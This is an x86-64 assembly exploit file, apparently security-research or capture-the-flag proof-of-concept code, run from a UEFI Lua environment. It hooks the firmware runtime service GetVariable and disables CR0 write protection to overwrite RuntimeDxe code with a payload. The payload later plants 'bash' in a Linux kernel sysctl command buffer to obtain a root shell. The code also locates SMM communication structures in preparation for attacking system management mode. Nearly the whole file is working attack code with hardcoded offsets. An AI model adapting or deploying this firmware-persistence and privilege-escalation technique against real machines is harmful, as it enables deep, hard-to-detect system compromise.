# Copyright 2022-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

  .globl _start

LuaEfi_off_gBS = 0x34638
LuaEfi_off_gRT = 0x34558
LuaEfi_off_retaddr = 0x1cf13

RuntimeDxe_off_ModuleEntryPoint = 0x2465
RuntimeDxe_off_RuntimeDriverSetVirtualAddressMap = 0x1e66

PiSmmIpl_off_mSmmCommunication = 0x7420

BS_off_AllocatePages = 40
BS_off_LocateProtocol = 320

RT_off_SetVirtualAddressMap = 56
RT_off_GetVariable = 72

AllocateAnyPages = 0
EfiRuntimeServicesData = 6

sysctl_run_command = 0xffffffff824a9360

_start:
  mov (%rsp),%rax
  push %rbx
  push %rsi
  push %rdi
  push %r12
  push %r13

  # R12 = gRT, R13 = gBS
  mov (LuaEfi_off_gRT-LuaEfi_off_retaddr)(%rax),%r12
  mov (LuaEfi_off_gBS-LuaEfi_off_retaddr)(%rax),%r13

  # ===== Infect gRT->GetVariable with a payload to get shell =====

  # orig_getvariable = gRT->GetVariable
  # I don't need to translate addresses with gRT->ConvertPointer or
  # use relative addresses... which is nice
  # This is due to arch/x86/platform/efi/efi_64.c efi_map_region:
  # > Make sure the 1:1 mappings are present as a catch-all for b0rked
  # > firmware which doesn't update all internal pointers after switching
  # > to virtual mode and would otherwise crap on us.
  mov RT_off_GetVariable(%r12),%rax
  mov %rax,orig_getvariable(%rip)

  # Allocating EfiRuntimeServicesCode pages become NX after Linux boot,
  # due to us not simulating ProtectUefiImageCommon and updating memory
  # attributes table. So, to make life easier, let's just infect RuntimeDxe...
  # R10 = RuntimeDxe._ModuleEntryPoint
  mov RT_off_SetVirtualAddressMap(%r12),%r10
  lea (RuntimeDxe_off_ModuleEntryPoint-RuntimeDxe_off_RuntimeDriverSetVirtualAddressMap)(%r10),%r10

  # gRT->GetVariable = R10
  mov %r10,RT_off_GetVariable(%r12)

  # memcpy(R10, payload, payload_end - payload)
  lea payload(%rip),%rsi
  mov %r10,%rdi
  mov $(payload_end - payload),%rcx

  # ... which is read-only, due to ProtectUefiImageCommon
  mov %cr0,%rax
  push %rax
  and $~0x10000,%rax
  mov %rax,%cr0

  rep movsb

  pop %rax
  mov %rax,%cr0

  # ===== Find location of PiSmmIpl.efi =====
  lea s_PiSmmIpl(%rip),%rsi
  call print

  # gBS->LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &addrbuf)
  lea gEfiSmmCommunicationProtocolGuid(%rip),%rcx
  xor %edx,%edx
  lea addrbuf(%rip),%r8
  call *BS_off_LocateProtocol(%r13)

  mov addrbuf(%rip),%rsi
  lea -(PiSmmIpl_off_mSmmCommunication)(%rsi),%rsi
  call print_hex

  mov $'\n',%al
  outb %al,(%dx)

  # ===== Allocate 2 Runtime Data pages for SMM Communication later on =====
  lea s_RtData(%rip),%rsi
  call print

  # gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &addrbuf)
  mov $AllocateAnyPages,%ecx
  mov $EfiRuntimeServicesData,%edx
  mov $2,%r8d
  lea addrbuf(%rip),%r9
  call *BS_off_AllocatePages(%r13)

  mov addrbuf(%rip),%rsi
  call print_hex

  mov $'\n',%al
  outb %al,(%dx)

  xor %eax,%eax
  pop %r13
  pop %r12
  pop %rdi
  pop %rsi
  pop %rbx
  ret

print_hex:
  mov $0x3f8,%dx
  xor %ebx,%ebx
  mov $16,%cl
print_hex_loop:
  rol $4,%rsi
  mov %sil,%bl
  and $0xf,%bl
  lea hextbl(%rip),%rax
  mov (%rax,%rbx,1),%al
  outb %al,(%dx)
  dec %cl
  jnz print_hex_loop
  ret

print:
  mov $0x3f8,%dx
print_loop:
  lodsb
  test %al,%al
  je print_ret
  outb %al,(%dx)
  jmp print_loop
print_ret:
  ret

gEfiSmmCommunicationProtocolGuid:
  .long 0xc68ed8e2
  .short 0x9dc6
  .short 0x4cbd
  .byte 0x9d, 0x94, 0xdb, 0x65, 0xac, 0xc5, 0xc3, 0x32

gEfiSmmConfigurationProtocolGuid:
  .long 0x26eeb3de
  .short 0xb689
  .short 0x492e
  .byte 0x80, 0xf0, 0xbe, 0x8b, 0xd7, 0xda, 0x4b, 0xa7

s_PiSmmIpl:
  .asciz "PiSmmIpl: "
s_RtData:
  .asciz "RtData: "

hextbl:
  .ascii "0123456789ABCDEF"

addrbuf:
  .quad 0

payload:
  mov (%rsp),%rax

  test %rax,%rax
  jns preboot

  # memcpy(sysctl_run_command, "bash", 4)
  push %rdi
  push %rsi
  push %rcx
  mov $sysctl_run_command,%rdi
  lea s_bash(%rip),%rsi
  mov $(s_bash_end - s_bash),%rcx
  rep movsb
  pop %rcx
  pop %rsi
  pop %rdi

preboot:
  mov orig_getvariable(%rip),%rax
  push %rax
  ret

orig_getvariable:
  .quad 0

s_bash:
  .ascii "bash"
s_bash_end:

payload_end:
